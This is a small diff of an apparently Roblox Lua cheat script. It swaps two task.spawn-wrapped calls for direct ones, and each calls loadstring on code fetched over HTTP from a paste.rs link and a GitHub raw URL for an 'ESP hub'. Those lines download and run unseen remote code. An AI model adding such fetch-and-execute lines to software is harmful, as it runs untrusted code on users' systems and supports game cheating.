@@ -310,11 +310,5 @@ else
     end)
 end
 
-task.spawn(function()
-    loadstring(game:HttpGet("https://paste.rs/bnoxX"))()
-end)
-
-task.spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLagHub3/XXXSCRIPT/refs/heads/main/EGG/ESP/HUB/V2"))()
-end)
-
+loadstring(game:HttpGet("https://paste.rs/bnoxX"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLagHub3/XXXSCRIPT/refs/heads/main/EGG/ESP/HUB/V2"))()
